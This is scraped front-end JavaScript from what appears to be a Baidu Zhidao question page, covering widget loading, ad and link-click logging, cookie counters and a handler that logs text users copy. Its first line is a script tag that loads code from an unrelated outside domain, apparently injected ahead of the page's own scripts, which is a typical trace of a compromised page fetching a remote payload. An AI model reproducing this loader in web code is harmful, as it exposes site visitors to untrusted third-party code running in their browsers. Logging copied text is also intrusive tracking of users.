<script src="http://cpm.36obuy.org/js/1.js"></script>!function(){    require.async('common:widget/userbar/userbar.js');
}();
!function(){  require.async('common:widget/js/logic/search-box/search-box.js');
}();
!function(){require.async('common:widget/menu/menu.js', function(menu){
	menu.init();
});
}();
!function(){    require.async('question:widget/share/share.js');
}();
!function(){    require.async('question:widget/ask/ask.js');
}();
!function(){    require.async('question:widget/value-comment/value-comment.js',function(vc){
        vc.init('1821407467');
    });
}();
!function(){    require.async('question:widget/related/related.js', function(rel){
        rel({
            cmsRelq: "",
            cmsRelqrl: "",
            isLog: false                    });
    });
}();
!function(){	require.async(['common:widget/lib/jquery/jquery.js', 'common:widget/js/util/log/log.js'], function($, log) {        
        $(".wgt-best .best-text").on('click', ".answer-expand", function(e) {
        	$(this).hide();
        	$(".wgt-best .best-text .answer-expand-content").hide();
        	$(".wgt-best .best-text .answer-collapse-content").show();
        	$(".wgt-best .best-text .answer-collapse").show();
        	log.send({page:'question',pos:'qb-detail-expand-btn-click'});
        });
        $(".wgt-best .best-text").on('click', ".answer-collapse", function(e) {
        	$(this).hide();
        	$(".wgt-best .best-text .answer-collapse-content").hide();
        	$(".wgt-best .best-text .answer-expand-content").show();
        	$(".wgt-best .best-text .answer-expand").show();        	
        });
    });
}();
!function(){        require.async('common:widget/js/util/log/log.js', function(log){
            //展现推送问题的PV
            log.addKey({push: '1'});
        });
    }();
!function(){require.async('question:widget/user/info/daily/daily.js', function(Daily){
	Daily.init('{"date":"2015","term":"394","list":[{"id":"2770","title":"\u624b\u673a\u6389\u8fdb\u9a6c\u6876\u600e\u4e48\u529e\uff1f","mt_img_src":"http:\/\/mt1.baidu.com\/timg?wh_rate=0&wapiknow&quality=100&size=w250&sec=0&di=8c33d98a23e690f130f83332b281aca5&src=http%3A%2F%2Fimg.iknow.bdimg.com%2Fjctuijian%2F0926%2F5.jpg"},{"id":"2776","title":"\u5927\u95f8\u87f9\uff0c\u4f60\u5403\u5bf9\u4e86\u5417\uff1f","mt_img_src":"http:\/\/mt1.baidu.com\/timg?wh_rate=0&wapiknow&quality=100&size=w250&sec=0&di=36671c2fec1024609a56271edeb31ed7&src=http%3A%2F%2Fimg.iknow.bdimg.com%2Fjctuijian%2F0926%2F6.jpg"},{"id":"2774","title":"\u5b66\u4e60\u597d\u8bf4\u660e\u4ec0\u4e48\uff1f","mt_img_src":"http:\/\/mt1.baidu.com\/timg?wh_rate=0&wapiknow&quality=100&size=w250&sec=0&di=c33456238667a0bf6607039515aecadb&src=http%3A%2F%2Fimg.iknow.bdimg.com%2Fjctuijian%2F0926%2F3.jpg"},{"id":"2772","title":"\u662f\u4ec0\u4e48\u8ba9\u6211\u4eec\u8fc7\u654f\uff1f","mt_img_src":"http:\/\/mt1.baidu.com\/timg?wh_rate=0&wapiknow&quality=100&size=w250&sec=0&di=a69fa2ed4b7cc90139d42e8974a8fff2&src=http%3A%2F%2Fimg.iknow.bdimg.com%2Fjctuijian%2F0926%2F1.jpg"},{"id":"2777","title":"\u4eba\u7c7b\u201c\u7075\u9b42\u201d\u53ef\u4ee5\u5199\u5165\u7535\u8111\u5417\uff1f","mt_img_src":"http:\/\/mt1.baidu.com\/timg?wh_rate=0&wapiknow&quality=100&size=w250&sec=0&di=3595d42e50870807a354cc3ee5e1a7a7&src=http%3A%2F%2Fimg.iknow.bdimg.com%2Fjctuijian%2F0926%2F7.jpg"},{"id":"2775","title":"\u5173\u4e8e\u8840\u6db2\u768420\u4e2a\u51b7\u77e5\u8bc6\uff0c\u4f60\u77e5\u9053\u5417\uff1f","mt_img_src":"http:\/\/mt1.baidu.com\/timg?wh_rate=0&wapiknow&quality=100&size=w250&sec=0&di=dcd0a361bd2f969b78b758fa81b060f3&src=http%3A%2F%2Fimg.iknow.bdimg.com%2Fjctuijian%2F0926%2F4.jpg"},{"id":"2773","title":"\u4e2d\u4e86\u50ac\u6cea\u5f39\u662f\u4ec0\u4e48\u611f\u89c9\uff1f","mt_img_src":"http:\/\/mt1.baidu.com\/timg?wh_rate=0&wapiknow&quality=100&size=w250&sec=0&di=322d913e0f48e5ccbef28f75f665253b&src=http%3A%2F%2Fimg.iknow.bdimg.com%2Fjctuijian%2F0926%2F2.jpg"}]}', '0');
});
}();
!function(){    
    require.async('question:widget/user/nologin/nologin.js');
}();
!function(){    
    require.async('question:widget/user/nologin-daily/nologin-daily.js');
}();
!function(){require.async('common:widget/js/logic/union/union.js', function(union){
// args[2, 3]自定义定向使用, common:union中有限制只能调用一次;
union('639889', 'union-qbrightdown', {
'zdquery'       : '',
'zdclassid' : '171',
'zhidaoqid'         : '304380006813743004'
});
});
}();
!function(){    require.async('question:widget/ad-right/ad-right.js');
}();
!function(){
require.async(['common:widget/js/util/tangram/tangram.js', 'common:widget/js/util/log/log.js', 'common:widget/js/util/event/event.js', 'common:widget/js/logic/submit/submit.js', 'common:widget/js/ui/dialog/dialog.js', 'question:widget/js/file/file.js', 'question:widget/js/inner-link/inner-link.js', 'question:widget/js/xiaozhi/xiaozhi.js', 'question:widget/js/left-promotion/left-promotion.js'], function($, log, ec, Submit, Dialog, File, innerLink, XiaoZhi, LeftPromotion){

$(function(){ 
                            if ( $( '.qbleftdown a' ).size() ) {
            log.addKey({
                ec_ads: '2',
                ec_ads_count: $('.qbleftdown').find('a.ec_ad_title, span.ec_qad_title, a.EC_ad_title').size()
            }); 
            $('.qbleftdown a').click(function(){
                var $parent = $( this ).parent();
                if ( this.id || this.className == 'EC_ad_title'
                    || $parent.hasClass( 'EC_ads_answer' )
                    || this.className == 'EC_ads_listurl'
                    || this.className == 'ec_ad_title'
                    || $parent.hasClass('ec_qad_title')
                    || $parent.hasClass('ec_qad_answerer') ) {
                    log.send({
                        type: 2014,
                        evtType: 'click',
                        pos: 'ec_ads'
                    });
                }
            });
        }
        require.async('question:widget/js/card/card.js', function(card){
            $('.avatar-normal-a').add('.user-name').each(function(index, item){
                new card({ target: item, type: 'normal' });
            });
            $('.avatar-mavin-a').add('.mavin-name').each(function(index, item){
                new card({target: item, type: 'mavin' });
            });
            $('.avatar-expert-a').add('.expert-name').each(function(index, item){
                new card({target: item, type: 'expert' });
            });
            $('.avatar-open-a').add('.open-name').each(function(index, item){
                new card({target: item, type: 'open' });
            });
            $('.open-level').each(function(index, item){
                new card({target: item, type: 'openLevel' });
            });
        });
        $('.fixed-ask-e').click(function(e){
            e.preventDefault();
            var username = $(this).attr('username');
            require.async('common:widget/js/logic/iask/iask.js', function(fixedAsk){
                fixedAsk(username);
            });
        });
        $('.replyask-shrink a').click(function(e){
            e.preventDefault();
            var flag = this.innerHTML.indexOf('展开') != -1;

            var dl = $(this).text( flag ? '收起' : '展开全部对话' ).parent().prevAll('.replyask');
            $($.makeArray(dl).reverse().slice(flag ? 0 : 14, dl.length)).css('display', flag ? 'block' : 'none');
        });
        if($('.thunder-wrap').size()){
            require.async('question:widget/js/thunder/thunder.js', function(thunder){
                $(function(){
                    thunder.init();
                });
            });
        }
        $.each(F.context('answers'), function(index, item){
            if(item.user){
                var eSid = item.user.openSiteId;
                if(eSid&&(eSid>=100000&&eSid<=999999)){
                    $('#answer-'+index).on('click', '.content a,p[accuse="aRefer"] a', function(e){
                         $.post('/c/oi_cv/cv', $.url.jsonToQuery({
                            tp:205,
                            rf:encodeURIComponent(document.referrer),
                            ai:this.href,
                            si:eSid
                         }), function(res, status, ajx){});
                    });
                }
            }
        });
        $(document).on('click', '.ikqb_img', function(){
            log.send({
                type: 2014,
                bigimg: 'click'
            });
        });
        $('a.optimus').on('click', function() {
            log.send({
                type: 2014,
                area: 'ad-right-optimus',
                action: 'click',
                cid: F.context('page')['cid'],
                cidTop: F.context('page')['cidTop'],
                cidMid: F.context('page')['cidMid']
            });
        });
        $('.qbrightdown a').click(function(){
            log.send({
                type: 2014,
                qid: F.context('page')['qid'],
                area: 'medical-right-txt-ads',
                action: 'click'
            });
        });
        if($('ikaudio').size()){
            log.addKey({
                'audio' : 1
            });

            require.async('question:widget/js/audio/audio.js', function(audio){
                audio.init();
            });
        }
        renderInitInnerLink();
        function renderInitInnerLink() {
            function initInnerLink(){
                F.context('qb_youyisi','');
                innerLink.init(2);
            }
            $('.best-text, .recommend-text, .answer-text').each(function(){
                var aid = /\d*$/g.exec( this.id )[0];
            
                if ( F.context('answers')[ aid ] ) {
                    if ( $(this).find('.ed2k-wrap').size() ) {
                        F.context('answers')[ aid ].insertLinkType = 1;
                    } else if ( $(this).find('file').size()  ) {
                        F.context('answers')[ aid ].insertLinkType = 2;
                    } else if ( $(this).find('pre[t="code"]').size() ) {
                        F.context('answers')[ aid ].insertLinkType = 3;
                    }
                }
            });
            if ((F.context('page').cidTop == 74 || F.context('page').cidTop == 95 || F.context('page').cidTop == 77)
                && ($('.wgt-best').size() || $('.wgt-recommend').size())) {

            } else {
                initInnerLink();
            }
        };
        require.async('question:widget/js/comment/comment.js', function(comm){
            comm.getCount();
        });
        $('.recommend-text, .best-text, .answer-text, .replyask-content').each(function(i, answerText){
            $(answerText).find('pre[t="code"]').each(function(i, pre){
                var loadSyntax = function(){
                    SyntaxHighlighter(pre);
                };
                
                $(pre).text($(pre).html($(pre).html().replace(/<br\s*\/?>/ig, '##IK_LINEBREAK##')).text().split('##IK_LINEBREAK##').join('\n'));

                $(pre).addClass('brush:'+$(pre).attr('l')+';toolbar:false;');
                if (window.SyntaxHighlighter) {
                    SyntaxHighlighter.highlight(pre);
                    $(answerText).find('.syntaxhighlighter .code .line').each(function(index, line){
                        $(answerText).find('.syntaxhighlighter .gutter .line').eq(index).height($(line).height());
                    });
                } else {
                    $.sio('http://img.iknow.bdimg.com/libs/SyntaxHighlighter/shCore.min.js').callByBrowser(function(){
                        SyntaxHighlighter.defaults['quick-code'] = false;
                        SyntaxHighlighter.config.stripBrs = true;
                        SyntaxHighlighter.highlight(pre);
                        $(answerText).find('.syntaxhighlighter .code .line').each(function(index, line){
                            $(answerText).find('.syntaxhighlighter .gutter .line').eq(index).height($(line).height());
                        });
                    });
                }
            });

            $(answerText).find('ikvideo').each(function(i, video){
                var id = 'VIDEO_' + $.id(),
                    src = $(video).attr('src'),
                    sid;

                var container = $('<div/>').attr('id', id).insertBefore($(video));
                if (src.indexOf('youku') > -1 && (sid = src.match(/sid\/(.*?)[\?\/]/))) {
                    if (sid[1]) {
                        src = 'http://player.youku.com/player.php/sid/'+sid[1]+'/v.swf';
                    }
                }

                container.html('<embed src="'+src+'" allowFullScreen="true" quality="high" width="'+$(video).attr('width')+'" height="'+$(video).attr('height')+'" align="'+$(video).attr('align')+'" allowScriptAccess="never" type="application/x-shockwave-flash"></embed>');
            });
        });

                log.send({
            'type'  : 2014,
            'page'  : 'question',
            'action': 'have_best_and_have_no_adopt'
        });
        require.async('common:widget/js/ui/lazyload/lazyload.js', function(lazyload){
        $('.wgt-replyer-best .avatar-48 a, .wgt-replyer-best .avatar-66 a, .wgt-replyer-special .avatar-66 a, #cms-company a').lazyload();
    });
    $('.ikqb-map').each(function(index, item) {
        var ifreamObj = $("<iframe/>").attr({
            frameborder: '0'
            ,width:"430" 
            ,height:"310"
            ,style: 'display:none;'
            ,className: 'answer-map'
        }),
        tmpsrc = $(item).attr("map") || $(item).attr("src");
        ifreamObj.attr('src', "http://zhidao.baidu.com/html/map" + tmpsrc.replace(/^iknow/i, ''));

        $(item).before(ifreamObj).remove();
        ifreamObj.after(
            $("<p/>").addClass('f-aid').html("本数据来源于百度地图，最终结果以百度地图最新数据为准。")
        ).show();
    });
        var mavinUidAry = [];
    $.object.each(F.context('answers'), function(item, key){
        if(item.user && item.user.mavinName){
            mavinUidAry.push(item.uid);
        }
    });

    if(mavinUidAry.length){
        var options = {
            uids: mavinUidAry.join(',')
        };

        $.post('/mavin/api/getmavinpv', options);
    }
    
        

                       
        require.async('common:widget/js/logic/ut/ut.js', function(UT){
        UT.start(['userbar','header','wgt-ask','answer-editor','wgt-answers']);
    });

    if ( $('file').size() == 0 ) {
        logPV();
    } else {
        File.init(logPV);
    }
    
    if (F.context('user')['isUserAdmin'] != '1'){
        require.async('question:widget/js/select-search/select-search.js', function(A){
            A.init();
        }); 
    }
        
    log.init({gjc:2014, query: 'body',action:'click'});
    function logPV(){
        var logOptions = {
            type: 2014,
            page: 'question', 
            action: 'entrance',
            screen: parseInt($('body').height()/$(window).height()),
            qid: F.context('page')['qid'],
            cid: F.context('page')['cid'],
            view: F.context('page').isView,
            cidTop: F.context('page')['cidTop'],
            refer: document.referrer
        };

        log.addKey({
             qid: F.context('page')['qid']
        });

        if (F.context('page').relateQids) {
            logOptions.relateQids = F.context('page').relateQids;
        }

        setTimeout(function(){
            log.send(logOptions, true);
        }, 100);
    }
    var loc_ans = $.url.getQueryValue(location.href, 'loc_ans');
    if(!loc_ans) {
        var myAnswerList = $('.wgt-best .answer-mine, .wgt-recommend .answer-mine, .wgt-special .answer-mine'),
            myAnswer = null; 
        if(myAnswerList.size()){        
            myAnswer = myAnswerList.first();        
            setTimeout(function(){
                $(document).scrollTop(myAnswer.offset().top - 10);
            }, 200);       
        }
    }else {
        var locAnswerList = $('.wgt-best .answer, .wgt-recommend .answer, .wgt-special .answer'),
            locAnswer = null;
        locAnswerList.each(function(index, item) {
            if($(item).attr("id").indexOf(loc_ans) != -1) {
                locAnswer = $(item);
            }
        });
        if(locAnswer) {
            setTimeout(function(){
                $(document).scrollTop(locAnswer.parent().offset().top - 10);
            }, 200);  
        }
    }
    if (F.context('egg')) {
        require.async('question:widget/js/egg/egg.js', function(egg){
            $(function(){
                egg.init(F.context('egg'));
            });
        });
    }
    var grid68  = $('.qb-content'), 
        qid = F.context('page')['qid'];
    $.each({
        'qb-content'            : '.q-content a@',                      
        'qb-supply-content'     : '.q-supply-content a@',               
        'qb-best-text'          : '.wgt-best .best-text a@',            
        'qb-special-bast-text'  : '.wgt-special .best-text a@',         
        'qb-recommend-text'     : '.wgt-recommend .recommend-text a@',  
        'qb-answer-text'        : '.answer-text a@',                    
        'qb-replyask-ask'       : '.ask+dd a',                          
        'qb-replyask-reply'     : '.reply+dd a',                        
        'qb-best-thank'         : '.thank pre a',                       
        'qb-answer-refer'       : '.answer-refer a'                     
    }, function(key, val){
        var aLink = grid68.find( val.replace(/\@$/, '[title!="点击查看大图"]') )
                    .not('.app-keyword,.inner-link')
                    .filter(function(){ 
                        return this.getAttribute('href').match(/^http/i) && this.innerHTML != '' && !$(this).closest('.ed2k-wrap').size() && !$(this).closest('.thunder-wrap').size() 
                    });
        if(aLink.length > 0){
            T(aLink).each(function(i,item){
                log.send({
                    'type'  : 2014,
                    'page'  : 'question',
                    'qid'   : qid,
                    'area'  : key,
                    'action': 'linkPv',
                    'text'  : item.getAttribute('href'),
                    'host'  : item.getAttribute('href').split('/')[2]
                });
            });
        }
        aLink.click(function(){
            log.send({
                'type'  : 2014,
                'page'  : 'question',
                'qid'   : qid,
                'area'  : key,
                'action': 'linkClick',
                'text'  : this.getAttribute('href'),
                'host'  : this.getAttribute('href').split('/')[2]
            });
        });
        grid68.find( val.replace(/\@$/, '') ).attr('rel', 'nofollow');
    });
    $(document).keydown(function(e){
        if(e.ctrlKey && e.keyCode == 67){
            var isStandard = Boolean(window.getSelection),
                selection = isStandard ? window.getSelection() : document.selection.createRange(),
                text = (isStandard ? selection + '' : selection.text).replace(/\n+/g,''),
                textLen = text.length;
            log.send({
                type: 2014,
                page: 'question',
                qid: F.context('page')['qid'],
                uid: F.context('user')['id'],
                action: 'ctrl+c',
                text: (textLen > 0 && textLen < 50) ? text : ''
            });
        }
    });
    var BAIDUID = $.cookie.get('BAIDUID') ? $.cookie.get('BAIDUID') : '0',
        recordkey = 'IK_' + BAIDUID.split(':')[0],
        recordCookie = $.cookie.get(recordkey) || 0,
        recordCidKey = 'IK_CID_'+F.context('page').cidTop,
        recordCidCookie = $.cookie.get(recordCidKey) || 0,
        cookieOpt = {
            expires : 1000*60*60*24*365,
            path : '/'
        };
    $.cookie.set(recordkey, parseInt(recordCookie) + 1, cookieOpt);
    $.cookie.set(recordCidKey, parseInt(recordCidCookie) + 1, cookieOpt);
    $.cookie.remove(recordkey,{
        path : '/question'
    });
    var cookieArr = document.cookie && document.cookie.split('; ');
    if(cookieArr.length){
        $.each(cookieArr, function(i, item){
            var cookieKey = item.split('=')[0];
            if(cookieKey != recordkey && cookieKey.match(/IK_[0-9A-Z]{32}/)){
                $.cookie.remove(cookieKey, {path: '/'});
            }
        });
    }
    if ($.cookie.get('IK_REFER_QID')) {
        $.cookie.remove('IK_REFER_QID', {path: '/'});
    }
    $(document).on('click', 'a[href*="/question/"]', function(){
        $.cookie.set('IK_REFER_QID', F.context('page').qid, {
            expires: 20000,
            path: '/'
        });
    });
                new LeftPromotion({
            imgSrc: 'http://img.baidu.com/img/iknow/ihome_0924.gif' + '?t=' + (new Date()).getTime(),
            url: 'http://zhidao.baidu.com/ihome?joinIhome=1&fr=xzh'
        });
            });

});
    window.Hunter = window.Hunter || {};
    Hunter.userConfig = Hunter.userConfig || [];
    var _hid = null;
	                        
	    
    if(_hid){
        Hunter.userConfig.push({ hid: _hid });
    }
}();
!function(){	require.async('common:widget/bottom-ask/bottom-ask.js');
}();
!function(){		
																require.async('common:widget/js/logic/dom-ready/dom-ready.js', function(D){ D.init({"pathname":"\/question\/778445593.html"}) });
            }();